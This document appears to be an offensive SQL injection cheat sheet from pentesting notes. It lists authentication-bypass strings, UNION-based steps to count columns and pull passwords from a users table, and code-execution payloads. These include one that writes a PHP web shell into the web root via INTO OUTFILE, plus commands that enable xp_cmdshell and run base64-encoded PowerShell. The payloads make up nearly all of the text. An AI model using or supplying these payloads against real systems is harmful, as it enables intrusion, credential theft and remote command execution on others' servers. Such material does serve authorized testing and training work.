#### Authentication Bypass

```
#Standard auth bypass will log in as the first user in the database table.
' OR 1=1 -- //

#Select all data from table users.
' OR 1=1 in (SELECT * FROM users) -- //

#Select all passwords from table users.
' or 1=1 in (SELECT password FROM users) -- //

#Select password from username admin. 
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
#### Union Injection
1. Enter SQLi characters to try and get a server error indicating a potential vulnerability.
2. Enter a UNION SQLi payload to try and get the server to respond with an error indicating the columns selected is wrong.
3. Continue to add a NULL column to each payload until it is accepted by the server with no error response.

```
#Identify how many columns returned in query.
'UNION SELECT NULL-- //
'UNION SELECT NULL,NULL-- //
'UNION SELECT NULL,NULL,NULL-- //

#Identify which columns can return string data.
'UNION SELECT 'a',NULL,NULL,NULL-- //

#Extract data.
'UNION SELECT <column>, <column>, FROM table -- //
```
#### Code Execution

```
#Upload a shell.
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

#Enable xp_cmdshell on sql server 2005
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#Execute Commands
' EXEC xp_cmdshell 'powershell -E <base64_payload>'; --
' EXEC xp_cmdshell "net user";
```